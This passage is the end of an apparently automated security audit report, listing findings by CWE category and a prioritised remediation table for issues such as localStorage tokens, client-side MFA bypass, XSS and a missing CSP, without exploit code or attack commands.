| CWE-307 | Improper Rate Limiting | 1 |
| CWE-829 | Untrusted Control Sphere | 1 |
| CWE-862 | Missing Authorization | 1 |
| CWE-798 | Use of Hardcoded Credentials | 1 |
| CWE-201 | Info Exposure Through Sent Data | 1 |
| CWE-89 | Improper Neutralization | 1 |

---

# PRIORITY REMEDIATION ORDER

| Priority | Vulnerability | Effort | Impact |
|----------|--------------|--------|--------|
| P0 | 1.1 Token in localStorage | Medium | Session hijacking of ALL users |
| P0 | 1.2 MFA Bypass (client-side) | Low | Complete MFA bypass |
| P0 | 1.3 AuthGuard race condition | Low | Full auth bypass |
| P0 | 1.4 Unauth document signing | Low | Fraudulent document signing |
| P0 | 2.1 Chat AI XSS | Low | XSS on every chat user |
| P1 | 8.1 Client-side rate limiting | Low | Unlimited brute force |
| P1 | 5.1 CV path traversal | Low | Storage bucket access |
| P1 | 5.2 Signature data URL | Medium | Biometric data leak |
| P1 | 10.1 CSP missing | Medium | All XSS vectors amplified |
| P1 | 7.1 Missing AuthGuard on route | Low | Unauthorized route access |
| P2 | 2.3 i18n escapeValue disabled | Low | Translation injection |
| P2 | 8.2 Sentry DSN in client | Low | Error pollution |
| P2 | 8.3 Performance monitoring leak | Low | URL/info leakage |
| P2 | 9.2 Multiple localStorage items | Medium | Data exposure |

---
*Report generated by automated security audit. All findings should be validated manually before remediation.*
